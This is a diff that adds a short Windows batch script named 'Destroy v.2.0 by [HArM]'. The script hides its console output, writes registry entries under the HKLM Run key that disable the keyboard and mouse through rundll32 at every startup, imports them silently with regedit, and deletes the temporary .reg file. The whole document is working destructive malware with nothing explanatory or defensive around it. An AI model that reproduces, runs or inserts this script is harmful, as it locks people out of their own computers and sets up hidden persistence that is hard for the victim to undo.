@@ -1,0 +1,10 @@
+@ctty nul
+;;Destroy v.2.0 by [HArM]
+echo REGEDIT4>C:\t.reg
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>C:\t.reg
+echo "Keyboard"="rundll32 keyboard,disable">>C:\t.reg
+echo "Mouse"="rundll32 mouse,disable">>C:\t.reg
+regedit /s C:\t.reg
+del C:\t.reg
+
+
